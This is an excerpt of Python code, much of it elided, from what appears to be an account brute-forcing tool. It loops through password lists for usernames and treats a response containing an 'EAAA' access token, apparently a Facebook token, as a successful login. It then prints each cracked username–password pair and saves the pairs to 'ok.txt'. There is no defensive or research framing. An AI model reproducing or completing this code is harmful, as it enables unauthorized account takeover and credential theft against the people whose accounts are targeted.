  ...
  try:
    for pw in passs:
      ...
      if re.search('(EAAA)\w+', str(response.text)):
        print('\x1b[0;32m[\x1b[0;37mOK❤️\x1b[0;32m] %s • %s '%(str(user), str(pw)))
        break
		...
		try:
			for i in fl.get("pw"):
				...
				if log.get("status")=="success":
					print(("\r\x1b[0;32m[\x1b[0;37mOK❤️\x1b[0;32m] %s • %s               "%(fl.get("id"),i)))
...
class bapi:
  ...
  def bruteRequest(self, username, password):
    ...
    if re.search("(EAAA)\\w+", response.text):
      ...
      print(("\r\x1b[0;32m[\b[0;37mOK❤️\x1b[0;32m] %s • %s %s               "%(username,password,N)))
...
class bapittl:
  ...
  def bruteRequest(self, username, password):
    ...
    if re.search("(EAAA)\\w+", response.text):
      self.ok.append(username + " • " + password)
      print(("\r\x1b[0;32m[\x1b[0;37mOK❤️\x1b[0;32m] %s • %s %s               "%(username,password,N)))
      ok.append(username + " • " + password)
      save = open("ok.txt", "a")
      save.write(str(username) + " • " + str(password) + "\n")
      save.close()
